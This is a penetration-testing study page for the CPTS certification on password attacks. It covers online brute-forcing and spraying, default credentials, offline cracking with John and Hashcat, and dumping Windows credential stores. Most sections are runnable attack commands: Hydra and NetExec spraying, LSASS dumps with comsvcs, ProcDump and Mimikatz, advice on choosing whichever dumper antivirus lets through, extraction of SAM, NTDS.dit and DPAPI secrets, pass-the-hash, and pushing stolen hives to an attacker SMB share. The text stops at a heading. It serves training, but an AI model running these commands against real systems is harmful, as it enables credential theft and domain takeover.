CPTS · Password attacks

Password attacks.

Password attacks end to end: brute-force and spray the services that authenticate users, reuse leaked and default credentials, dump the places Windows keeps credentials, then crack the hashes you capture offline with John the Ripper and Hashcat. Open any node for what it means and the commands behind it, or walk the offline crack step by step. Run noisy online attacks only against systems you are authorised to test, watch for account lockout, and keep every credential with the rest of the engagement notes.

Full cracking command reference on the CPTS page

Crack workflow

The path from a captured hash to a cracked password: 6 steps. Each step is marked on the map.

  1. 1Identify

    Name the format with hashID (-j for John, -m for Hashcat) and the sample-hash references.

    hashid -j 193069ceb0461e1d40d216e32c79c704
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
  2. 2Build the wordlist

    Mutate target-specific base words with rules (hashcat --stdout -r), and harvest the site with CeWL.

    cat custom.rule
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
wc -l mut_password.list
  3. 3Extract (if a file)

    Protected file, key or archive? Run the matching *2john script (ssh2john, office2john, zip2john...) to get a crackable hash.

    grep -rnE '^-{5}BEGIN [A-Z0-9]+ PRIVATE KEY-{5}$' /home 2>/dev/null
ssh-keygen -yf id_rsa
ssh2john id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash
john ssh.hash --show
  4. 4Dictionary + rules

    Run a dictionary attack with your wordlist, then again with rules: john --rules, or hashcat -a 0 -r.

    hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
  5. 5Mask / brute force

    Known shape? Run a mask attack (hashcat -a 3) or John's incremental brute force, narrowed to a charset and length.

    hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
  6. 6Collect

    Read cracked passwords back with --show and record where each one came from.

    john --show hashes
hashcat -m 1000 ntlm.txt --show

The crack, step by step

  1. 01

    Remote service attacks

    Most network services authenticate with a username and password. Brute-force or spray them for a foothold, or to turn a cracked password into access.

    • The services worth attacking

      Networks run services that authenticate with a username and password: FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, LDAP. To drive a Windows host remotely the usual three are RDP (3389), WinRM (5985/5986) and SSH (22, uncommon on Windows, standard on Linux). Services are often left on default settings with password auth enabled, so they are worth a login attack, but online guessing is noisy and can lock accounts out.

      • WinRM

        Windows Remote Management is Microsoft's WS-Management implementation: XML web services over SOAP that bridge WBEM and WMI (and can reach DCOM) to manage Windows remotely. It is off by default on Windows 10/11 and must be enabled, so finding it open means someone turned it on. Default ports TCP 5985 (HTTP) and 5986 (HTTPS).

    • NetExec (nxc)

      NetExec (nxc, the maintained successor to CrackMapExec) sprays credentials across a protocol and reports what works. Install with apt. General form: netexec <proto> <ip> -u <user or list> -p <pass or list>. Protocols: nfs, ftp, ssh, winrm, smb, wmi, rdp, mssql, ldap, vnc. A (Pwn3d!) beside a WinRM or SMB hit means the account can most likely execute commands, not just log in.

      sudo apt-get install -y netexec
netexec -h
netexec winrm 10.129.42.197 -u user.list -p password.list
netexec smb 10.129.42.197 -u user -p password --shares
      • Per-protocol help

        Each protocol has its own options; netexec <proto> -h prints them (netexec smb -h is huge: shares, --sam, --lsa, --ntds, spidering, command execution). The target can be an IP, range, CIDR, hostname, file of targets, or an Nmap/Nessus export.

        netexec smb -h
netexec ssh 10.129.42.197 -u user.list -p password.list
    • Evil-WinRM (shell)

      Once WinRM creds work, Evil-WinRM opens an interactive shell over PowerShell Remoting (MS-PSRP). Install it as a gem. It is the standard way to use a WinRM foothold.

      sudo gem install evil-winrm
evil-winrm -i 10.129.42.197 -u user -p password
    • SSH (Hydra, then log in)

      SSH (TCP 22) secures the channel with symmetric encryption (AES, 3DES; the key agreed by Diffie-Hellman), asymmetric key authentication (a private key, often unprotected, is as good as a login) and hashing for integrity. Brute the password with Hydra, throttling to about four tasks because SSH configs cap parallel logins, then connect with the OpenSSH client.

      hydra -L user.list -P password.list -t 4 ssh://10.129.42.197
ssh user@10.129.42.197
    • RDP (Hydra, then xfreerdp)

      RDP (TCP 3389) gives a full remote desktop. Brute it with Hydra, but keep the task count low (-t 1 to 4, -W to wait): RDP dislikes parallel connections and the module is experimental. Hydra may report an account as "valid but not active for remote desktop" when the password is right but the account lacks RDP rights. Connect with xfreerdp (or Remmina).

      hydra -L user.list -P password.list -t 4 rdp://10.129.42.197
xfreerdp /v:10.129.42.197 /u:user /p:password
    • SMB (Hydra / Metasploit)

      SMB (TCP 445, file and printer sharing; CIFS is the dialect, Samba the Linux implementation) authenticates too. Hydra can brute it, but an old THC-Hydra fails SMBv3 with "invalid reply from target"; fall back to Metasploit's auxiliary/scanner/smb/smb_login. With valid creds, list shares with netexec --shares and browse them with smbclient.

      hydra -L user.list -P password.list smb://10.129.42.197
netexec smb 10.129.42.197 -u user -p password --shares
smbclient -U user \\10.129.42.197\SHARENAME
      • Metasploit smb_login

        When Hydra cannot speak SMBv3, use the smb_login scanner: set USER_FILE, PASS_FILE and RHOSTS, then run. STOP_ON_SUCCESS and a low THREADS keep it tidy; a Success line confirms the pair.

        msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
msf6 auxiliary(scanner/smb/smb_login) > run

  2. 02

    Spraying, stuffing & defaults

    One password against many accounts, reused credentials against new services, and the credentials nobody changed.

    • Password spraying

      Spraying tries a single password across many usernames, the opposite of hammering one account, so it stays under lockout thresholds (one guess per account per round). It pays off where new accounts get a standard password such as ChangeMe123! that someone never changed. For Active Directory use NetExec or Kerbrute; for web apps, Burp.

      netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'
    • Credential stuffing

      Stuffing replays username:password pairs stolen from one service against others, betting on reuse across email, social and enterprise logins. Hydra's -C flag takes a combined user:pass file (one pair per line) rather than separate lists.

      hydra -C user_pass.list ssh://10.100.38.23
    • Default credentials

      Routers, firewalls, databases and appliances ship with default credentials that are meant to be changed at setup but often are not. The defaultcreds-cheat-sheet tool looks them up by product (creds search <vendor>); product documentation and router lists are the other sources. Collect the finds into a user:pass list and feed Hydra.

      pip3 install defaultcreds-cheat-sheet
creds search linksys
hydra -C defaults.list <proto>://<ip>
      • Router defaults

        Routers are less likely to be left on defaults because they are critical, but internal test routers often are. Common brand/IP/username/password combinations are in the router-defaults table below; the admin panel usually sits at the gateway IP.

  3. 03

    Windows credentials: dump & crack

    Where Windows keeps credentials: dump the SAM hives, LSASS memory, Credential Manager vaults and the domain's NTDS.dit, then crack the NT and DCC2 hashes, or pass them.

    • The authentication flow

      On an interactive logon, WinLogon (the trusted process that owns login, lock/unlock and password changes) launches LogonUI, which collects credentials through a credential provider (a COM DLL). WinLogon hands them to LSASS, which runs them through an authentication package and checks them against the SAM (local) or Active Directory (domain) via LSALogonUser. The LSA is the protected subsystem that authenticates users, holds local security policy, and maps names to SIDs.

      • LSASS (the gatekeeper)

        The Local Security Authority Subsystem Service (%SystemRoot%\System32\lsass.exe) enforces local security policy, authenticates users and forwards audit logs. Its Negotiate function picks NTLM or Kerberos. Because it holds live credential material in memory, LSASS is a prime dumping target (Mimikatz).

      • Authentication packages

        Authentication packages are DLLs LSASS loads to do the checks: Lsasrv, Msv1_0 (local/NTLM), Samsrv (SAM), Kerberos, Netlogon, Ntdsa (AD, DCs only). They are listed in the authentication-packages table below.

    • SAM database

      The Security Account Manager stores local account credentials as LM or NTLM hashes in the registry. The file is %SystemRoot%\system32\config\SAM, mounted at HKLM\SAM, and reading it needs SYSTEM privileges. SYSKEY partially encrypts it on disk with a system boot key (held in HKLM\SYSTEM), so you need both to decrypt the hashes. A workgroup host keeps users locally in SAM; a domain host validates against AD's ntds.dit instead.

    • Credential Manager, NTDS & DPAPI

      Beyond SAM, Windows keeps credentials in several stores. Credential Manager holds per-user saved logins in the Credential Locker (AppData\Local\Microsoft\Credentials), DPAPI-encrypted. NTDS.dit is the Active Directory database on Domain Controllers (user, group and computer accounts with hashes, plus GPOs), synced across DCs except RODCs. DPAPI is the per-user encrypt/decrypt API behind saved browser and Outlook passwords, RDP credentials and Credential Manager entries.

    • Dump the hives (reg.exe)

      With local admin you can back up the registry hives and crack offline, with no live session to maintain. SAM holds the hashes, SYSTEM the boot key that decrypts them, SECURITY the LSA secrets (DCC2, cleartext, DPAPI keys). For local users you only need SAM and SYSTEM; take SECURITY too for cached domain credentials. Run reg.exe from an elevated cmd.exe.

      reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
      • Which hive holds what

        SAM, SYSTEM and SECURITY each play a part in dumping and cracking; the registry-hives table below says what each one holds and why you need it.

      • Other SAM routes (remote, no reg.exe)

        reg.exe save is the manual route; there are quicker ones. Impacket's secretsdump pulls the SAM over SMB in one shot from credentials or a hash, with no files left on disk (remote registry plus a temporary service). NetExec's --sam does the same and writes the hashes to its logs. On an interactive box Mimikatz reads them live with lsadump::sam. From PowerShell, PowerSploit's Invoke-PowerDump dumps SAM without touching reg.exe. With SeBackupPrivilege but not full admin, robocopy /b copies the locked hive files out.

        secretsdump.py ILF.local/jmarston:'P@ssword!'@10.129.42.197
netexec smb 10.129.42.197 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --sam
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
    • Exfiltrate with smbserver

      Move the saved hives to your attack host over SMB with Impacket's smbserver: start a share, then use the Windows move command to push the files. Pass -smb2support, or modern Windows (SMBv1 disabled by default) will refuse to connect.

      sudo smbserver.py -smb2support CompData /home/you/Documents/
C:\> move sam.save \\10.10.15.16\CompData
C:\> move system.save \\10.10.15.16\CompData
C:\> move security.save \\10.10.15.16\CompData
    • secretsdump (extract hashes)

      Impacket's secretsdump reads the three hives and prints the local SAM hashes as uid:rid:lmhash:nthash, plus cached domain logons and LSA secrets (DPAPI machine/user keys, NL$KM). It fetches the boot key first to decrypt the SAM. Copy the NT hash (the fourth field, after the LM hash) for each user into a file, noting which hash is whose.

      locate secretsdump
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
    • Crack NT hashes (-m 1000)

      Most modern Windows stores passwords as NT hashes; older systems (pre-Vista / Server 2008) may still hold weaker LM hashes. Put the NT hashes in a file and crack with Hashcat mode 1000. NTLM is unsalted and fast (megahashes per second), so a wordlist with rules clears weak passwords quickly. Reuse what cracks, people repeat passwords across systems.

      hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hashestocrack.txt --show
    • Crack DCC2 hashes (-m 2100)

      SECURITY yields DCC2 (MS Cache v2) hashes, local copies of domain credentials cached for offline logon ($DCC2$10240#user#...). Hashcat mode 2100. They use PBKDF2, so they crack roughly 800 times slower than NTLM and cannot be used for pass-the-hash, which means a strong one is often uncrackable inside an engagement window.

      hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
    • Decrypt DPAPI secrets

      The DPAPI machine and user keys from SECURITY unlock DPAPI blobs: saved browser and Outlook passwords, RDP credentials and Credential Manager entries. Decrypt them with Impacket's dpapi, Mimikatz, or remotely with DonPAPI. Mimikatz's dpapi::chrome pulls the AES key and reads the saved login directly.

      mimikatz # dpapi::chrome /in:"...\Chrome\User Data\Default\Login Data" /unprotect
    • Dump remotely (NetExec)

      With credentials that hold local admin, you can dump over SMB instead of touching disk: --sam for the local SAM hashes, --lsa for LSA secrets (which may expose service and cached credentials in cleartext). NetExec writes the loot to its logs for later cracking.

      netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --sam
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa
    • Attacking LSASS (memory dump)

      LSASS caches the credentials of every active logon session in memory, so dumping its process memory and parsing the dump offline yields hashes, and sometimes cleartext, without ever cracking the SAM. Take the same offline-first approach as the hives: snapshot LSASS, pull the dump to your box, parse it there. Modern AV flags the common dump methods as malicious, so expect to deal with that.

      • Dump LSASS memory

        Two methods built into Windows. With an interactive desktop: Task Manager, Processes tab, right-click Local Security Authority Process, Create dump file, which writes lsass.DMP to %temp%. From a shell: rundll32 calls comsvcs.dll's MiniDump function, which needs the LSASS PID first (tasklist /svc, or Get-Process lsass). Run it from an elevated prompt. The comsvcs route is faster and needs no GUI, but AV usually recognises it.

        tasklist /svc
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
      • If comsvcs is blocked: other dumpers

        When AV kills the comsvcs route, reach for an alternative. ProcDump (a signed Sysinternals binary, often allow-listed) writes a full dump with -ma. nanodump and dumpert evade the common usermode hooks. From PowerShell with no extra binary, PowerSploit's Out-Minidump dumps the process. Remotely over SMB with local admin, NetExec's lsassy module dumps and parses LSASS in one step. And if you can run Mimikatz live, sekurlsa::logonpasswords reads the secrets straight from memory with no dump on disk. Pick whichever your AV lets through.

        procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp
nanodump.exe --write C:\lsass.dmp
powershell -c "Import-Module .\Out-Minidump.ps1; Get-Process lsass | Out-Minidump"
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' -M lsassy
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
      • Exfiltrate the dump (smbserver)

        Pull lsass.dmp back to the attack host with Impacket's smbserver, exactly as with the SAM hives: start a share, then move the file over SMB. Keep -smb2support so modern Windows (SMBv1 disabled) will connect. Parsing offline keeps time on the target short.

        sudo smbserver.py -smb2support CompData /home/you/Documents/
C:\> move C:\lsass.dmp \\10.10.15.16\CompData
      • Parse with pypykatz, then crack

        pypykatz is Mimikatz reimplemented in Python, so it parses an LSASS dump offline on a Linux host (Mimikatz is Windows-only). pypykatz lsa minidump <dump> walks each logon session and prints its secrets: MSV (the NT and SHA1 hashes), WDIGEST (cleartext on older Windows), Kerberos (tickets and keys) and the DPAPI masterkey. The secret types are in the table below. Crack the NT hash with Hashcat mode 1000.

        pypykatz lsa minidump /home/you/lsass.dmp
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
    • Attacking Credential Manager (Windows Vault)

      Credential Manager (since Windows 7 / Server 2008 R2) lets users and apps save credentials for other systems, sites and services. They live in encrypted vault/locker folders under the user and system profiles; each vault's Policy.vpol holds AES-128/256 keys that are themselves protected by DPAPI, and on newer Windows those master keys are guarded by Credential Guard in VBS memory enclaves. Two kinds are stored: Web Credentials (websites, legacy IE/Edge) and Windows Credentials (domain logons, network shares, services such as OneDrive). Enumerate them, reuse them without the password, or decrypt them.

      • Enumerate (cmdkey)

        cmdkey /list prints the current user's saved credentials with their Target (the resource or account), Type (Generic or Domain Password), User, and persistence (an entry marked Local machine persistence survives reboots). A WindowsLive:target=virtualapp/didlogical entry is an internal Microsoft-account ID you can ignore; a Domain:interactive=HOST\user entry is a reusable interactive domain logon.

        whoami
cmdkey /list
      • Reuse without the password (runas /savecred)

        When cmdkey shows a Domain:interactive credential, you do not need its plaintext: runas /savecred spends the saved credential to launch a process as that user. Confirm with whoami in the new shell. A quick path from a stored credential to impersonation.

        runas /savecred /user:SRV01\mcharles cmd
whoami
      • Decrypt the plaintext (mimikatz / DPAPI)

        To recover the actual password, decrypt the vault. Mimikatz pulls saved credentials straight from LSASS with sekurlsa::credman (run privilege::debug first), or decrypts the vault files by hand with its dpapi module using the DPAPI master key. SharpDPAPI, LaZagne and DonPAPI do the same, DonPAPI remotely.

        mimikatz # privilege::debug
mimikatz # sekurlsa::credman
      • Export the vault (keymgr.dll)

        The GUI route: rundll32 keymgr.dll,KRShowKeyMgr opens the Stored User Names and Passwords window, where a vault exports to a password-protected .crd file (also doable from Control Panel) that imports on another Windows host. The vault and locker folder paths are in the table below.

        rundll32 keymgr.dll,KRShowKeyMgr
    • Active Directory: dump NTDS.dit

      On a domain-joined network the prize is the Domain Controller's NTDS.dit (%SystemRoot%\NTDS\ntds.dit, "directory information tree"), the Active Directory database holding every domain account's username and password hash. Capture it, with the SYSTEM hive for the boot key as with the SAM, and the whole domain falls. Getting there: build and validate usernames, guess a password, reach the DC as an admin, then copy and extract the database. These attacks need a foothold on the internal network and are noisy.

      • Find the domain & build usernames

        First, name the domain. An nmap scan of the KDC and LDAP ports reads the realm from krb5-enum-users and the LDAP root DSE, so you have the --domain value for everything below; enum4linux-ng, or netexec smb <dc> with no creds, prints it too. Then usernames: they follow a convention (jdoe, jane.doe, doe.jane), often visible in an email address (jdoe@corp means jdoe) or scraped from the company site. Turn real names into candidates by hand or with username-anarchy, then confirm which exist with Kerbrute's userenum (Kerberos pre-auth, no login attempt, so it is quiet and cannot lock accounts). The conventions are in the table below.

        nmap -p 88,389 --script krb5-enum-users,ldap-rootdse 10.129.201.57
netexec smb 10.129.201.57
./username-anarchy -i names.txt > usernames.txt
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain corp.local usernames.txt
      • Guess passwords (NetExec or Kerbrute)

        With valid usernames, brute or spray them. NetExec over SMB is the obvious route, but each attempt logs Event ID 4776 and counts toward lockout. When SMB is filtered or you want to stay quieter, Kerbrute does it over Kerberos (AS-REQ pre-auth): passwordspray tries one password across every user (stays under lockout), bruteuser tries a wordlist against one user you already trust, and a hit prints the plaintext. Mind account lockout either way (not enabled by default in AD, so many environments are exposed).

        netexec smb 10.129.201.57 -u usernames.txt -p 'Welcome1' --continue-on-success
./kerbrute_linux_amd64 passwordspray --dc 10.129.201.57 -d corp.local usernames.txt 'Welcome1'
./kerbrute_linux_amd64 bruteuser --dc 10.129.201.57 -d corp.local /usr/share/wordlists/fasttrack.txt jmarston
      • Reach the DC & check rights

        Log in to the DC with the working credential, Evil-WinRM gives a PowerShell session. Copying NTDS.dit needs local admin (Administrators) or Domain Admin, so check your rights with net localgroup and net user <user> (look for Domain Admins or Administrators in the memberships).

        evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
net localgroup
net user bwilliamson
      • Copy NTDS.dit (VSS, or ntdsutil IFM)

        NTDS.dit is locked while AD runs, so you cannot copy it directly. vssadmin creates a shadow copy of C: that can be read live, and you copy ntds.dit from the shadow volume. Grab the SYSTEM hive too, the hashes are encrypted with its boot key and will not decrypt without it. Two fallbacks if vssadmin is blocked or missing: diskshadow scripts the same snapshot (handy on Server where vssadmin is locked down), and ntdsutil's IFM (Install From Media) writes a clean, consistent copy of NTDS.dit plus the SYSTEM hive to a folder in one command, no shadow copy to clean up.

        vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
reg.exe save hklm\system C:\NTDS\SYSTEM
ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q
      • Extract the hashes (three methods)

        Three ways to turn the files, or the DC itself, into hashes. (1) Local: move the copied NTDS.dit and SYSTEM to the attack host over an smbserver share and run secretsdump against them with LOCAL. (2) Remote one-shot: point secretsdump straight at the DC with Domain Admin credentials and -just-dc-ntlm for just the NT hashes (uses DRSUAPI, no manual copy). (3) NetExec: its ntdsutil module runs the whole snapshot-and-dump on the DC and pulls the hashes back. Any route gives every domain hash, krbtgt and the machine accounts included, in pwdump format (user:rid:lm:nt).

        impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
secretsdump.py ILF.local/jmarston:'P@ssword!'@10.129.201.57 -just-dc-ntlm
netexec smb 10.129.201.57 -u jmarston -p 'P@ssword!' -d ILF.local -M ntdsutil
      • Crack, or Pass-the-Hash

        Crack the NT hashes with Hashcat mode 1000. If one will not crack, you can still use it: Pass-the-Hash authenticates with the hash itself over NTLM (username:hash instead of username:password), so an uncracked Administrator hash is still a login. Evil-WinRM takes -H for exactly this; more on PtH in the AD enumeration and attacks material.

        hashcat -m 1000 ntds_hashes.txt /usr/share/wordlists/rockyou.txt
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

  4. 04

    Identify the hash

    The format has to match, or nothing cracks. Guess it, confirm it, then tell the tool: --format for John, -m for Hashcat.

    • An unknown hash

      Hashes often arrive with no label, and even the tools cannot always name them with certainty. 193069ceb0461e1d40d216e32c79c704 is a 32-hex-character string that could be MD5, NTLM, LM, RIPEMD-128 and a dozen others. Narrowing it down is part of the job; the context it came from is often the deciding clue. (This particular one is RIPEMD-128.)

    • 1hashID (-j John, -m Hashcat)

      hashID checks a hash against a built-in list and suggests formats. -j adds the matching John format name beside each guess, -m adds the Hashcat mode number, so you can go straight to --format or -m. It usually returns several candidates, not one, so weigh them against where the hash came from.

      hashid -j 193069ceb0461e1d40d216e32c79c704
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
    • Sample-hash references

      When a tool will not commit, compare against known examples. John's own sample-hash documentation and the PentestMonkey cheat sheet list example hashes next to the John format name. Hashcat hosts a comprehensive example-hashes table that does the same for mode numbers. Match your hash by shape, then look up the value.

    • Tell the tool the format

      Once you know it, name it so the tool stops guessing. John takes --format=<name> (--list=formats lists them all); Hashcat takes -m <mode> (hashcat --help lists every mode and its ID). The two reference tables below pair common formats with the John value and the Hashcat mode.

      john --format=raw-md5 hashes
john --list=formats
hashcat -m 0 hashes wordlist
hashcat --help | grep -i md5

  5. 05

    Build a targeted wordlist

    A generic list is often blocked or exhausted. Mutate words that fit the target, and harvest the target's own language.

    • How users beat a password policy

      Policies force length and character classes (typically 8+ characters with an uppercase, a lowercase, a number and a symbol), but people meet them predictably. They capitalise the first letter (Password), append numbers (Password123), a year (Password2022) or a month (Password02), end with an exclamation mark (Password2022!), and leetspeak the letters (P@ssw0rd2022!). Most passwords are ten characters or fewer, and a forced rotation usually just bumps a digit or swaps the month. Knowing this, you mutate a small set of likely base words rather than brute-forcing blind.

      • Seed words from OSINT

        The best base words come from the target: the company name, the region and industry, and personal details, pet and family names, hobbies, sports, interests. Basic OSINT (the Corporate Recon material) turns these up. Pick terms of at least five characters; a base word plus a year and a symbol already fills a ten-character policy.

    • 2Generate mutations (hashcat --stdout -r)

      A rule file tells Hashcat how to transform each input word, one rule per line. Run the base list through the rules with --stdout to print the mutations instead of cracking, and save a custom wordlist. The rule functions are in the table below: : does nothing, c capitalises, so0 replaces o with 0, sa@ replaces a with @, $! appends an exclamation mark, and rules combine on a line (c so0). A single word like password through a fifteen-line custom.rule yields password, Password, p@ssw0rd, P@ssw0rd!, and so on.

      cat custom.rule
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
wc -l mut_password.list
    • Prebuilt rulesets (best64)

      Both tools ship rulesets you do not have to write. best64.rule is the usual first reach: 64 common transformations that crack a surprising share of passwords. Hashcat's live under /usr/share/hashcat/rules (best64, rockyou-30000, dive and more); John has its own in john.conf. Cracking is a guessing game, so narrow it with what you know, policy, company, region, industry, keywords, unless the password simply leaked.

      john --wordlist=rockyou.txt --rules=best64 hashes
hashcat -a 0 -m 0 hashes rockyou.txt -r /usr/share/hashcat/rules/best64.rule
    • Harvest a site with CeWL

      CeWL spiders a company's website and collects the words it uses into a list, which you then feed through your rules. The result is far likelier to hold an employee's base word than a generic list. Set the spider depth with -d, the minimum word length with -m, store words in lowercase with --lowercase, and write the output with -w.

      cewl https://www.example.com -d 4 -m 6 --lowercase -w site.wordlist
wc -l site.wordlist
hashcat -a 0 -m 0 hashes site.wordlist -r custom.rule
    ↓ Proceed to John the Ripper
  6. 06

    John the Ripper

    The CPU cracker. Open-source since 1996; reach for it on boxes without a GPU, for odd formats, and for its *2john file converters.

    • Use the jumbo build

      John the Ripper (JtR, or john) recovers passwords from hashes through dictionary and brute-force-style attacks. The community "jumbo" build is the one to use: performance optimisations, multilingual word lists, 64-bit support, and far more hash formats than the core release. The *2john converters come with it.

      john --list=build-info
    • john --single

      Single crack mode is rule-based and best against Linux credentials. It builds candidates from the victim's own data, the username, home directory name and GECOS fields (full name, room, phone), then runs them through a large set of common string-mangling rules. A user named Bob Smith might use Smith1, so single mode tries exactly that. Feed it a passwd-format file and it reads the identity fields itself.

      john --single passwd
john --show passwd
    • john --wordlist=

      Wordlist mode is a dictionary attack: every entry in one or more plain-text wordlists, one candidate per line. Separate several with commas. Add --rules to mutate each word (append digits, capitalise, add symbols) and reach passwords the raw list misses. The workhorse once single mode is exhausted.

      john --wordlist=/usr/share/wordlists/rockyou.txt hashes
john --wordlist=rockyou.txt --rules hashes
john --show hashes
    • john --incremental

      Incremental mode is a smart brute force. It generates candidates from a statistical (Markov) model so likelier passwords come first, which makes it far more efficient than naive brute force, but it is still the most exhaustive and slowest mode. The character sets and length limits live in john.conf; name a charset directly (--incremental=ASCII) or build your own custom.chr. Narrow the set and length to keep it tractable.

      john --incremental hashes
john --incremental=ASCII hashes
grep '# Incremental modes' -A 100 /etc/john/john.conf
      • Predefined charsets

        john.conf ships several: Custom ($JOHN/custom.chr), UTF8 (196 characters), Latin1 (CP1252, 203 characters), and ASCII (95 characters, MaxLen 13). Pick one with --incremental=<name>, or make a custom.chr for special characters and specific patterns. A tighter set and shorter MaxLen finish sooner.

    ↓ Proceed to Hashcat
  7. 07

    Hashcat

    The GPU cracker. Open-source since 2015, Linux/Windows/macOS; the fastest route when you have a real GPU and a supported hash.

    • hashcat -a <mode> -m <type>

      Hashcat cracks a wide variety of hashes with strong GPU support. The general form is hashcat -a <attack mode> -m <hash type> <hashes> [wordlist, rule, mask...]. -a picks the attack (0 dictionary, 3 mask), -m picks the hash type by ID, <hashes> is a string or a file of same-type hashes, and the rest depends on the attack. In a VM without a GPU it crawls, so a CPU box is often faster with John.

      hashcat -a 0 -m 0 hashes /usr/share/wordlists/rockyou.txt
hashcat --help
hashcat -m 1000 ntlm.txt --show
      • Finding the hash type (-m)

        Hashcat supports hundreds of hash types, each with a numeric ID. hashcat --help prints the full list (e.g. 0 MD5, 100 SHA1, 1400 SHA2-256, 1000 NTLM, 2100 DCC2). Confirm an unknown one against the Hashcat example-hashes table, or with hashid -m. The Hashcat modes table below lists the common ones.

    • 4Dictionary attack (-a 0)

      The dictionary attack takes a wordlist and tries each word against the hash until it cracks or the list runs out. Identify the hash type first (an MD5 like e3e3ec5831ad5e7288241960e5d4fdb8 is mode 0), then point hashcat at rockyou. The first thing to try.

      hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
    • Rules (-r)

      A wordlist alone is often not enough. Rules apply modifications to each candidate, appending numbers, substituting leet characters and more, to generate many more guesses from the same list. Hashcat's rule files live in /usr/share/hashcat/rules; best64.rule (64 standard modifications) is the usual first reach, with bigger sets like rockyou-30000.rule and dive.rule when it is not enough. Append -r <ruleset> to a dictionary attack.

      ls -l /usr/share/hashcat/rules
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
    • 5Mask attack (-a 3)

      A mask attack is a brute force where you define the keyspace explicitly, so you try only the shapes a password could take instead of every combination. A mask is a sequence of charset symbols. To try an uppercase letter, four lowercase, a digit, then a symbol, the mask is ?u?l?l?l?l?d?s. Far faster than blind brute force when you know the shape; the symbol table is below.

      hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
      • Custom charsets (-1 to -4)

        Beyond the built-in symbols, define up to four custom sets with -1, -2, -3 and -4, then reference them in the mask as ?1, ?2, ?3 and ?4. For example -1 ?l?d builds a set of lowercase letters and digits, used in a mask as ?1. Handy when a policy mixes a known subset of characters.

    ↓ Proceed to Protected files & archives
  8. 08

    Protected files & archives

    Encrypted files, keys and archives crack too: a *2john script extracts a hash, then John or Hashcat does the rest.

    • Hunt for encrypted files

      First find what is worth cracking. Encrypted files take many extensions (FileInfo lists hundreds); search the filesystem for the common document and archive types and strip the noise. An unfamiliar extension is a search-engine lookup away. Encryption at rest is often neglected, so sensitive documents, statements and contracts turn up unencrypted or weakly protected.

      for ext in $(echo ".xls .xls* .doc .doc* .pdf .pp* .od* .zip .rar .7z .kdbx"); do echo "\nExt: $ext"; find / -name "*$ext" 2>/dev/null | grep -v "lib\|fonts\|share\|core"; done
    • 3SSH keys (ssh2john)

      SSH private keys have no fixed extension, so find them by content: the header line -----BEGIN ... PRIVATE KEY-----. Old PEM keys announced encryption in the header (Proc-Type: 4,ENCRYPTED); modern OpenSSH keys look identical whether encrypted or not, so test one with ssh-keygen -yf, which prints the public key for an unencrypted key and prompts for a passphrase for an encrypted one. An encrypted key becomes a hash with ssh2john, then crack it.

      grep -rnE '^-{5}BEGIN [A-Z0-9]+ PRIVATE KEY-{5}$' /home 2>/dev/null
ssh-keygen -yf id_rsa
ssh2john id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash
john ssh.hash --show
    • Office & PDF (office2john, pdf2john)

      Password-protected Office documents and PDFs are everywhere. office2john extracts a hash from any common Office format, pdf2john does the same for a PDF; the cracking step is identical to any other hash. Swap one script for the other depending on the file.

      office2john Protected.docx > office.hash
john --wordlist=rockyou.txt office.hash
pdf2john PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show
    • ZIP archives (zip2john)

      A password-protected ZIP cracks like anything else once zip2john pulls the hash out. The extracted hash names the archive and the file inside it ($pkzip2$...); feed it to John with a wordlist, then --show the result.

      zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
john zip.hash --show
    • OpenSSL-encrypted archives (GZIP)

